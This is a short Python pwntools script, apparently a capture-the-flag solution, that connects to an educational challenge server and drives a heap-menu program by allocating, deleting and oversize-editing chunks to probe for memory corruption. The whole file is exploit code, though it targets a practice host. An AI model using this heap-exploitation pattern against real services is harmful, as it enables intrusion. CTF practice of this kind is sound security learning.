import pwn
from pprint import pprint
#proc = pwn.process(["./chal"], aslr=False)
proc = pwn.remote("edu-ctf.zoolab.org", 10008)
def alloc_chunk(num:int):
    proc.sendlineafter(b"> ", b"1")
    proc.sendlineafter(b"index\n> ", str(num).encode())
    proc.sendafter(b"username\n> ", b"a"*0x10)
    proc.sendafter(b"password\n> ", b"a"*0x10)
    proc.recvuntil(b"success!\n")

def edit_chunk(num:int, content:bytes, sz = -1):
    if sz == -1:
        sz = len(content)
    proc.sendlineafter(b"> ", b"2")
    proc.sendlineafter(b'index\n> ', str(num).encode())
    proc.sendlineafter(b'size\n> ', str(sz).encode())
    proc.send(content)
    proc.recvuntil(b"success!\n")

def del_chunk(num:int):
    proc.sendline(b"3")
    proc.sendline(str(num).encode())
    proc.recvuntil(b"success!\n")
alloc_chunk(1)
del_chunk(0)
edit_chunk(1, b"a"*16, 40)
proc.sendlineafter(b"> ", b"4")
print(proc.recv())
